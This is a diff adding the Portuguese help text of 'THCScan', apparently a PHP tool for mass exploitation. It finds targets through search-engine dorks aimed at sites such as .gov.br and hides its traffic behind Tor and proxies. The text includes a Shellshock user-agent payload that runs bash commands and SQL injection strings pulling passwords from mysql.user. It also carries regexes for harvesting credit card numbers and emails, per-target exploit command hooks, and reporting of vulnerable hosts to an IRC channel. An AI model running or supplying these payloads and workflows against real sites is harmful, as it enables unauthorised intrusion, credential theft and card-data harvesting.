@@ -1,0 +1,452 @@
+.___________. __    __    ______      _______.  ______      ___      .__   __. 
+|           ||  |  |  |  /      |    /       | /      |    /   \     |  \ |  | 
+`---|  |----`|  |__|  | |  ,----'   |   (----`|  ,----'   /  ^  \    |   \|  | 
+    |  |     |   __   | |  |         \   \    |  |       /  /_\  \   |  . `  | 
+    |  |     |  |  |  | |  `----..----)   |   |  `----. /  _____  \  |  |\   | 
+    |__|     |__|  |__|  \______||_______/     \______|/__/     \__\ |__| \__| 
+                                                                               
+                                                                               
+         
+ _    _ ______ _      _____  
+| |  | |  ____| |    |  __ \
+| |__| | |__  | |    | |__) |
+|  __  |  __| | |    |  ___/
+| |  | | |____| |____| |    
+|_|  |_|______|______|_|
+
+[!]Versao Atual PHP =>[ 7.0.27-0+deb9u1 ]
+[!]Desenvolvedor do Script =>[ ravok ]
+[!]OS Atual =>[ Linux debian 4.9.0-6-amd64 #1 SMP Debian 4.9.82-1+deb9u3 (2018-03-02) x86_64 ]
+[!]Local Atual =>[ /home/ravok/scan ]
+
+ _[ - ]::--------------------------------------------------------------------------------------------------------------
+    
+-h
+--help   Comando de ajuda alternativo de longa duração.
+--ajuda  Comando para especificar a Ajuda.
+--info   Roteiro de informações.
+--update Atualização de código.   
+-q       Escolha qual mecanismo de pesquisa você deseja [1...24] / [e1..6]]:
+     [opçoes]:
+     1   - GOOGLE / (CSE) GENERIC RANDOM / API
+     2   - BING
+     3   - YAHOO BR
+     4   - ASK
+     5   - HAO123 BR
+     6   - GOOGLE (API)
+     7   - LYCOS
+     8   - UOL BR
+     9   - YAHOO US
+     10  - SAPO
+     11  - DMOZ
+     12  - GIGABLAST
+     13  - NEVER
+     14  - BAIDU BR
+     15  - YANDEX
+     16  - ZOO
+     17  - HOTBOT
+     18  - ZHONGSOU
+     19  - HKSEARCH
+     20  - EZILION
+     21  - SOGOU
+     22  - DUCK DUCK GO
+     23  - BOOROW
+     24  - GOOGLE(CSE) GENERIC RANDOM
+     ----------------------------------------
+	MOTORES ESPECIAIS (SPECIAL MOTORS)
+     ----------------------------------------
+     e1  - TOR FIND
+     e2  - ELEPHANT
+     e3  - TORSEARCH
+     e4  - WIKILEAKS
+     e5  - OTN
+     e6  - EXPLOITS SHODAN
+     ----------------------------------------
+     all - Todos os motores de busca / motores não especiais
+     Padrao:    1
+     Examplo: -q {op}
+     Uso:   -q 1
+              -q 5
+              Usando mais de um mecanismo:  -q 1,2,5,6,11,24
+               Usando todos os motores:      -q all
+     
+ --proxy Escolha qual proxy você deseja usar por meio do mecanismo de pesquisa:
+     Examplo: --proxy {proxy:port}
+     Uso:   --proxy localhost:8118
+              --proxy socks5://googleinurl@localhost:9050
+              --proxy http://admin:12334@172.16.0.90:8080
+   
+ --proxy-file Definir arquivo de fonte para randomizar seu proxy para cada mecanismo de pesquisa.
+     Examplo: --proxy-file {proxys}
+     Uso:   --proxy-file proxys_list.txt
+
+ --time-proxy Defina a hora com que freqüência o proxy será trocado.
+     Exemplo: --time-proxy {second}
+     Uso:   --time-proxy 10
+
+ --proxy-http-file Definir arquivo com urls http proxy,
+      são usados para motores de busca bular capch
+     Exemplo: --proxy-http-file {youfilehttp}
+     Uso:   --proxy-http-file http_proxys.txt
+         
+
+ --tor-random Ativa a função TOR, cada uso vincula um IP exclusivo.
+ 
+ -t  Escolha o tipo de validação: op1, 2, 3, 4, 5
+     [opçoes]:
+     1   - TO primeiro tipo usa erros padrão considerando o script:
+      Estabelece conexão com o exploit através do método get.
+     Ex: www.alvo.com.br/pasta/index.php?id={exploit}
+   
+     2   -  O segundo tipo tenta validar o erro definido por: -a='VALUE_INSIDE_THE _TARGET'
+     Também estabelece conexão com a exploração através do método get
+     Ex: www.alvo.com.br/pasta/index.php?id={exploit}
+   
+     3   - O terceiro tipo combina os primeiro e segundo tipos:
+      Então, claro, também estabelece conexão com o exploit através do método get
+     Ex: www.target.com.br{exploit}
+     Padrao:    1
+     Exmplo: -t {op}
+     Uso:   -t 1
+     
+     4   - O quarto tipo uma validação com base no arquivo de origem e será ativado funções padrão do scanner.
+      O arquivo de origem dos seus valores é concatenado com o URL de destino.
+      - Defina o seu alvo com o comando--target {http://target}
+     - Configure seu arquivo com o comando -o {file}
+     Explicaçao:
+     Valores do arquivo de origem:
+     /admin/index.php?id=
+     /pag/index.php?id=
+     /brazil.php?new=
+     Ex: 
+     www.target.com.br/admin/index.php?id={exploit}
+     www.target.com.br/pag/index.php?id={exploit}
+     www.target.com.br/brazil.php?new={exploit}
+     
+     5   - (FIND PAGE) O quinto tipo de validação baseado no arquivo de origem,
+      Será ativado apenas um código de validação 200 no servidor de destino, ou se o URL enviar esse código será considerado vulnerável.
+      - Defina o seu alvo com o comando --target {http://target}
+    - Defina seu arquivo com o comando-o {file}
+     Explicaçao:
+     Valores do arquivo de origem:
+     /admin/admin.php
+     /admin.asp
+     /admin.aspx
+     Ex: 
+     www.target.com.br/admin/admin.php
+     www.target.com.br/admin.asp
+     www.target.com.br/admin.aspx
+     Observação: Se mostrar que o código 200 será separado no arquivo de saída
+
+      ERROS PADRÃO:
+     
+     [*]JAVA INFINITYDB, [*]LOCAL FILE INCLUSION, [*]ZIMBRA MAIL,           [*]ZEND FRAMEWORK, 
+     [*]ERROR MARIADB,   [*]ERROR MYSQL,          [*]ERROR JBOSSWEB,        [*]ERROR MICROSOFT,
+     [*]ERROR ODBC,      [*]ERROR POSTGRESQL,     [*]ERROR JAVA INFINITYDB, [*]ERROR PHP,
+     [*]CMS WORDPRESS,   [*]SHELL WEB,            [*]ERROR JDBC,            [*]ERROR ASP,
+     [*]ERROR ORACLE,    [*]ERROR DB2,            [*]JDBC CFM,              [*]ERROS LUA, 
+     [*]ERROR INDEFINITE
+     
+         
+ --dork Define qual dork o mecanismo de pesquisa usará.
+     Exemplo: --dork {dork}
+     Uso:   --dork 'site:.gov.br inurl:php? id'
+     - Usando multiplas dorks:
+     Examplo: --dork {[DORK]dork1[DORK]dork2[DORK]dork3}
+     Uso:   --dork '[DORK]site:br[DORK]site:ar inurl:php[DORK]site:il inurl:asp'
+ 
+ --dork-file Definir arquivo de fonte com seus dorks de pesquisa.
+     Exemplo: --dork-file {dork_file}
+     Uso:   --dork-file 'dorks.txt'
+
+ --exploit-get Define qual exploit será injetado através do método GET para cada URL encontrada.
+     Exemplo: --exploit-get {exploit_get}
+     Uso:   --exploit-get "?'´%270x27;"
+     
+ --exploit-post Define qual exploit será injetado através do método POST para cada URL encontrada.
+     Exemplo: --exploit-post {exploit_post}
+     Uso:   --exploit-post 'field1=valor1&field2=valor2&field3=?´0x273exploit;&botao=ok'
+     
+ --exploit-command Define qual exploit / parameter será executado nas opções:--command-vul/ --command-all.   
+    O exploit-command será identificado pelos parâmetros: --command-vul/ --command-all as _EXPLOIT_      
+     Ex --exploit-command '/admin/config.conf' --command-all 'curl -v _TARGET__EXPLOIT_'
+     _TARGET_ é o URL / TARGET especificado obtido pelo processo
+      _EXPLOIT_ é o exploit / parâmetro definido pela opção --exploit-command.
+     Exemplo: --exploit-command {exploit-command}
+     Uso:   --exploit-command '/admin/config.conf'  
+     
+ -a  Especifique a string que será usada no script de pesquisa:
+     Exemplo: -a {string}
+     Uso:   -a '<title>Bola Mais um Braw!</title>'
+     
+ -d  Especifique o uso do script op 1, 2, 3, 4, 5.
+     Exemplo: -d {op}
+     Uso:   -d 1 /URL do mecanismo de pesquisa.
+              -d 2 /Mostrar todo o URL.
+              -d 3 /Solicitação detalhada de cada URL.
+              -d 4 /Mostra o HTML de cada URL.
+              -d 5 /Solicitação detalhada de todos os URLs.
+              -d 6 /PING Detalhado - PONG irc.
+             
+ -s  Especifique o arquivo de saída onde serão salvos os URLs vulneráveis.
+     
+     Exemplo: -s {file}
+     Uso:   -s Seu_Arquivo.txt
+     
+ -o  Gerenciar manualmente os URLs vulneráveis que você deseja usar de um arquivo, sem usar um mecanismo de pesquisa. 
+     Exemplo: -o {arquivo_onde_meus_URLs}
+     Uso:   -o test.txt
+   
+ --persist  Tentativas quando o Google bloqueia sua pesquisa.
+      O script tenta outro host / padrão do Google = 4
+     Exemplo: --persist {number_attempts}
+     Uso:   --persist 7
+
+ --ifredirect Retornar o post do método de validação REDIRECT_URL
+     Exemplo: --ifredirect {string_validation}
+     Uso:   --ifredirect '/admin/painel.php'
+
+ -m  Ative a pesquisa por emails nos URLs especificados.
+  
+ -u  Permite a pesquisa de listas de URLs no URL especificado.
+ 
+ --gc Ative a validação de valores com o google webcache.
+     
+ --pr  Varredura progressiva, usada para definir operadores (dorks),
+      faz a busca de um idiota e resultados válidos, então vai um idiota de cada vez.
+  
+ --file-cookieAbra o arquivo de cookie.
+     
+ --save-as Salve os resultados em um determinado lugar.
+
+ --shellshock Explore a vulnerabilidade do shellshock definindo um user agent malicioso.
+ 
+ --popup Executar --command all ou vuln em um terminal paralelo.
+
+ --cms-check Ative a verificação simples se o URL / destino estiver usando o CMS.
+
+ --no-bannerRemova o banner de apresentação do script.
+     
+ --unique Filtrar resultados em domínios exclusivos.
+
+ --beep Bipe som quando uma vulnerabilidade é encontrada.
+     
+ --alexa-rank Mostrar o posicionamento de alexa nos resultados.
+     
+ --robots Mostrar robôs de arquivo de valores.
+      
+ --range Definir intervalo IP.
+      Exemplo: --range {range_start,rage_end}
+      Uso:   --range '172.16.0.5#172.16.0.255'
+
+ --range-rand Definir quantidade de ips aleatórios.
+      Exemplo: --range-rand {rand}
+      Uso:   --range-rand '50'
+
+ --irc Envio vulnerável ao canal IRC / servidor.
+      Exemplo: --irc {server#channel}
+      Uso:   --irc 'irc.rizon.net#THCScan'
+
+ --http-header Definir cabeçalho HTTP.
+      Exemplo: --http-header {youemail}
+      Uso:   --http-header 'HTTP/1.1 401 Unauthorized,WWW-Authenticate: Basic realm="Top Secret"'
+          
+ --sedmail Envio vulnerável a email.
+      Exemplo: --sedmail {youemail}
+      Uso:   --sedmail youemail@inurl.com.br
+          
+ --delay Atraso entre processos de pesquisa.
+      Exemplo: --delay {second}
+      Uso:   --delay 10
+  
+ --time-out Tempo limite para sair do processo.
+      Exemplo: --time-out {second}
+      Uso:   --time-out 10
+
+ --ifurl Filtrar URLs com base em seu argumento.
+      Exemplo: --ifurl {ifurl}
+      Uso:   --ifurl index.php?id=
+
+ --ifcode Resultados válidos com base no seu código http de retorno.
+      Exemplo: --ifcode {ifcode}
+      Uso:   --ifcode 200
+ 
+ --ifemail Filtrar e-mails com base em seu argumento.
+     Exemplo: --ifemail {file_where_my_emails_are}
+     Uso:   --ifemail sp.gov.br
+
+ --url-reference Defina o URL de referência na solicitação para enviá-lo contra o destino.
+      Exemplo: --url-reference {url}
+      Uso:   --url-reference http://target.com/admin/user/valid.php
+ 
+ --mp Limita o número de páginas nos mecanismos de pesquisa.
+     Exemplo: --mp {limit}
+     Uso:   --mp 50
+     
+ --user-agent Defina o agente do usuário usado em sua solicitação no destino.
+      Exemplo: --user-agent {agent}
+      Uso:   --user-agent 'Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11'
+      Usage-exploit / SHELLSHOCK:   
+      --user-agent '() { foo;};echo; /bin/bash -c "expr 299663299665 / 3; echo CMD:;id; echo END_CMD:;"'
+      Complete command:    
+      php THCScan.php --dork '_YOU_DORK_' -s shellshock.txt --user-agent '_YOU_AGENT_XPL_SHELLSHOCK' -t 2 -a '99887766555'
+ 
+ --sall Salva todos os URLs encontrados pelo scanner.
+     Exemplo: --sall {file}
+     Uso:   --sall your_file.txt
+
+ --command-vul Cada URL vulnerável encontrada executará esses parâmetros de comando.
+     Exemplo: --command-vul {command}
+     Uso:   --command-vul 'nmap sV -p 22,80,21 _TARGET_'
+              --command-vul './exploit.sh _TARGET_ output.txt'
+              --command-vul 'php miniexploit.php -t _TARGET_ -s output.txt'
+                  
+ --command-all Use este comando para especificar um único comando para CADA URL encontrado.
+     Exemplo: --command-all {command}
+     Uso:   --command-all 'nmap sV -p 22,80,21 _TARGET_'
+              --command-all './exploit.sh _TARGET_ output.txt'
+              --command-all 'php miniexploit.php -t _TARGET_ -s output.txt'
+    [!] Observaçao:
+   
+    _TARGET_ será substituído pelo URL / destino encontrado, embora se o usuário
+     não insere o get, apenas o domínio será executado.
+   
+    _TARGETFULL_ será substituído pelo URL / destino original encontrado.
+       
+    _TARGETXPL_ será substituído pelo URL / destino original encontrado + EXPLOIT --exploit-get.
+       
+    _TARGETIP_ retorno do URL / destino do ip encontrado.
+        
+    _URI_ Voltar URL conjunto de pastas / destino encontrados.
+        
+    _RANDOM_ Seqüências aleatórias.
+        
+    _PORT_ Capture a porta do teste atual, dentro do processo --port-scan.
+   
+    _EXPLOIT_  será substituído pelo argumento do comando especificado --exploit-command.
+   O exploit-command será identificado pelos parâmetros --command-vul/ --command-all as _EXPLOIT_
+
+ --replace Substitua os valores no URL de destino.
+    Exemplo:  --replace {value_old[INURL]value_new}
+     Uso:   --replace 'index.php?id=[INURL]index.php?id=1666+and+(SELECT+user,Password+from+mysql.user+limit+0,1)=1'
+              --replace 'main.php?id=[INURL]main.php?id=1+and+substring(@@version,1,1)=1'
+              --replace 'index.aspx?id=[INURL]index.aspx?id=1%27´'
+                  
+ --remove Remover valores no URL de destino.
+      Exemplo: --remove {string}
+      Uso:   --remove '/admin.php?id=0'
+              
+ --regexpUsando expressão regular para validar sua pesquisa, o valor do
+     A expressão será procurada no destino / URL.
+    Exemplo:  --regexp {regular_expression}
+    Todos os principais cartões de crédito:
+    Uso:    --regexp '(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|6011[0-9]{12}|3(?:0[0-5]|[68][0-9])[0-9]{11}|3[47][0-9]{13})'
+    
+    IP Addresses:
+    Uso:    --regexp '((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?))'
+    
+    EMAIL:   
+    Uso:    --regexp '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
+    
+
+ ---regexp-filter Usando expressões regulares para filtrar sua pesquisa, o valor do
+      A expressão será procurada no destino / URL.
+    Exemplo:  ---regexp-filter {regular_expression}
+    EMAIL:   
+    Uso:    ---regexp-filter '([\w\d\.\-\_]+)@([\w\d\.\_\-]+)'
+ 
+
+    [!] Gerenciador de pequenos comandos:
+    
+ --exploit-cad Registro de comandos para uso dentro do scanner.
+    Format {TYPE_EXPLOIT}::{EXPLOIT_COMMAND}
+    Exemplo de Format: NMAP::nmap -sV _TARGET_
+    Exemplo de Format: EXPLOIT1::php xpl.php -t _TARGET_ -s output.txt
+    Uso:    --exploit-cad 'NMAP::nmap -sV _TARGET_' 
+    Observaçao: Cada comando registrado é identificado por um id de sua matriz.
+                  Comandos são registrados no arquivo exploits.conf.
+
+ --exploit-all-id Executar comandos, exploits baseados no id de uso,
+     (tudo) é executado para cada destino encontrado pelo mecanismo.
+     Exemplo: --exploit-all-id {id,id}
+     Uso:   --exploit-all-id 1,2,8,22
+         
+ --exploit-vul-id Executar comandos, exploits baseados no id de uso,
+     (vull) executa o comando somente se o alvo foi considerado vulnerável.
+     Exemplo: --exploit-vul-id {id,id}
+     Uso:   --exploit-vul-id 1,2,8,22
+
+ --exploit-list Listar todas as entradas no arquivo exploits.conf.
+
+
+    [!] Executando subprocessos:
+    
+ --sub-file  Subprocesso executa uma injeção
+      strings em URLs encontradas pelo mecanismo, por meio de GET ou POST.
+     Exemplo: --sub-file {youfile}
+     Uso:   --sub-file exploits_get.txt
+         
+ --sub-get define se as strings vindas de
+      --sub-file será injetado via GET.
+     Uso:   --sub-get
+         
+ --sub-post define se as strings vindas de
+      --sub-file será injetado via POST.
+     Uso:   --sub-get
+         
+ --sub-concat Define a string a ser concatenada com
+      o host de destino dentro do subprocesso
+     Exemplo: --sub-concat {string}
+     Uso:   --sub-concat '/login.php'
+
+ --sub-cmd-vul Cada URL vulnerável encontrado no subprocesso
+      irá executar os parâmetros deste comando.
+     Exemplo: --sub-cmd-vul {command}
+     Uso:   --sub-cmd-vul 'nmap sV -p 22,80,21 _TARGET_'
+              --sub-cmd-vul './exploit.sh _TARGET_ output.txt'
+              --sub-cmd-vul 'php miniexploit.php -t _TARGET_ -s output.txt'
+                  
+ --sub-cmd-all Execute o comando para cada destino encontrado no escopo do subprocesso.
+     Exemplo: --sub-cmd-all {command}
+     Uso:   --sub-cmd-all 'nmap sV -p 22,80,21 _TARGET_'
+              --sub-cmd-all './exploit.sh _TARGET_ output.txt'
+              --sub-cmd-all 'php miniexploit.php -t _TARGET_ -s output.txt'
+
+
+ --port-scan Define portas que serão validadas como abertas.
+     Exemplo: --port-scan {ports}
+     Uso:   --port-scan '22,21,23,3306'
+         
+ --port-cmd Defina o comando que é executado ao encontrar uma porta aberta.
+     Exemplo: --port-cmd {command}
+     Uso:   --port-cmd './xpl _TARGETIP_:_PORT_'
+              --port-cmd './xpl _TARGETIP_/file.php?sqli=1'
+
+ --port-write Envie valores para a porta.
+     Exemplo: --port-write {'value0','value1','value3'}
+     Uso:   --port-write "'NICK nk_test','USER nk_test 8 * :_ola','JOIN #THCScan','PRIVMSG #THCScan : minha_msg'"
+
+
+
+    [!] Modificando valores usados nos parâmetros de script:
+    
+ md5 Criptografar valores em md5.
+     Exemplo: md5({value})
+     Uso:   md5(102030)
+     Uso:   --exploit-get 'user?id=md5(102030)'
+
+ base64 Criptografar valores em base64.
+     Exemplo: base64({value})
+     Uso:   base64(102030)
+     Uso:   --exploit-get 'user?id=base64(102030)'
+         
+ hex Criptografar valores em hexadecimal.
+     Exemplo: hex({value})
+     Uso:   hex(102030)
+     Uso:   --exploit-get 'user?id=hex(102030)'
+
+ hex Gere valores aleatórios.
+     Exemplo: random({character_counter})
+     Uso:   random(8)
+     Uso:   --exploit-get 'user?id=random(8)'
+
